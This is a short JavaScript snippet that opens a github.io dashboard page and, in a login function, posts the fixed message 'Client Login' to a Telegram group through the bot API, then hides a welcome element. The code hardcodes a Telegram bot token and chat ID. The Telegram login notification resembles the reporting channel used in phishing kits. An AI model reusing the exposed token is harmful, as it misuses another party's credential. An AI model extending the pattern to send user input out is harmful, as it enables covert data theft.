window.open("https://4marr.github.io/dashboard/")

function login(){
    let text = "Client Login"
    let gabungan = text;
    let token = '7180436531:AAFk8zEKwCJTeUGvN6fgw9rDqu6_iOHbCfk';
    let grup = '-4271367193';

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })

    document.querySelector(".welcome").style.display = "none";
}
